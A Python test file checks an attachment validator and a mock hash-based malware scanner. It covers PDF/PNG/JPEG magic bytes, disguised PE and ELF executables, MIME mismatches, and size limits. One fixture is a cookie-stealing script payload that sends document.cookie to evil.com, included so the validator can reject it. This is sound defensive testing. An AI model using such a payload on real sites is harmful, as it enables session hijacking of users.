import hashlib

from pulse109.security.attachments import (
    MockMalwareScanner,
    validate_attachment,
)


def test_valid_pdf_attachment_passes():
    content = b"%PDF-1.4\n1 0 obj\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF"
    res = validate_attachment(content, "application/pdf")
    assert res.is_valid is True
    assert res.detected_mime == "application/pdf"
    assert res.error_code is None
    assert res.byte_size == len(content)


def test_valid_png_and_jpeg_pass():
    png_content = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
    res_png = validate_attachment(png_content, "image/png")
    assert res_png.is_valid is True
    assert res_png.detected_mime == "image/png"

    jpeg_content = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01"
    res_jpeg = validate_attachment(jpeg_content, "image/jpeg")
    assert res_jpeg.is_valid is True
    assert res_jpeg.detected_mime == "image/jpeg"


def test_executable_pe_header_rejected():
    # Disguised Windows PE executable pretending to be PDF
    content = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff"
    res = validate_attachment(content, "application/pdf")
    assert res.is_valid is False
    assert res.error_code == "executable_attachment_forbidden"
    assert res.detected_mime == "application/x-executable"


def test_linux_elf_executable_rejected():
    content = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    res = validate_attachment(content, "application/pdf")
    assert res.is_valid is False
    assert res.error_code == "executable_attachment_forbidden"


def test_script_injection_in_attachment_rejected():
    content = b"<script>document.location='http://evil.com/'+document.cookie</script>"
    res = validate_attachment(content, "text/plain")
    assert res.is_valid is False
    assert res.error_code == "script_injection_detected"


def test_mime_mismatch_rejected():
    png_content = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
    res = validate_attachment(png_content, "image/jpeg")
    assert res.is_valid is False
    assert res.error_code == "mime_mismatch"
    assert res.detected_mime == "image/png"


def test_empty_attachment_rejected():
    res = validate_attachment(b"", "application/pdf")
    assert res.is_valid is False
    assert res.error_code == "attachment_empty"


def test_oversized_attachment_rejected():
    content = b"%PDF-" + b"0" * 1024
    res = validate_attachment(content, "application/pdf", max_size_bytes=500)
    assert res.is_valid is False
    assert res.error_code == "attachment_too_large"


def test_malware_scanner_identifies_bad_hashes():
    bad_content = b"%PDF-malicious-exploit-payload"
    bad_hash = hashlib.sha256(bad_content).hexdigest()
    scanner = MockMalwareScanner(known_bad_hashes={bad_hash})

    # Clean file scan
    clean_content = b"%PDF-clean-citizen-statement"
    clean_hash = hashlib.sha256(clean_content).hexdigest()
    res_clean = scanner.scan(clean_content, clean_hash)
    assert res_clean.is_clean is True
    assert res_clean.threat_name is None

    # Malicious file scan
    res_bad = scanner.scan(bad_content, bad_hash)
    assert res_bad.is_clean is False
    assert res_bad.threat_name == "EICAR_OR_KNOWN_MALICIOUS_HASH"
